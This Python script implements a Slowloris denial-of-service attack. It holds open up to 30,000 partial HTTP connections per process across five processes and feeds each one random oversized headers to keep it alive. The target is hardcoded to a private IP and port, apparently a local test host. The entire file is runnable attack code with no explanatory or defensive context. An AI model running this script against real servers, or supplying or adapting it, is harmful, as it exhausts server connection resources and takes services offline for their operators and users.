import time
import random
import string
import socket
from multiprocessing import Pool

def chunkify(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))

BASE_PAYLOAD = '\r\n'.join([
    'GET / HTTP/1.1',
    'Host: localhost:5000',
    'Cache-Control: no-cache',
    'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive'
])

def spawn_connection(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((target_ip, target_port))
    s.send(BASE_PAYLOAD.encode())
    return s

def send_chunk(socket):
    header_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 10)))
    header_val = ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 5000)))
    CHUNK = 'X-{0}: {1}\r\n'.format(header_name, header_val)
    socket.send(CHUNK.encode())

def slowloris(target, port):
    open_sockets = []
    MAX_SOCKETS = 30000
    skip = True
    while True:
        print(len(open_sockets), 'open sockets')
        if len(open_sockets) < MAX_SOCKETS:
            #print(len(open_sockets), ' - spawning')
            try:
                thread_result = spawn_connection(target, port)
                open_sockets.append(thread_result)
            except Exception as e:
                print(e)
        else:
            skip = False
        for socket in open_sockets:
            try:
                send_chunk(socket)
            except Exception as e:
                open_sockets.remove(socket)

        #if not skip:
        #    time.sleep(5)

if __name__ == '__main__':
    t = 5
    pool = Pool(processes=t)
    for _ in range(t):
        pool.apply_async(slowloris, ('192.168.1.129', 8888))
    while True:
        pass
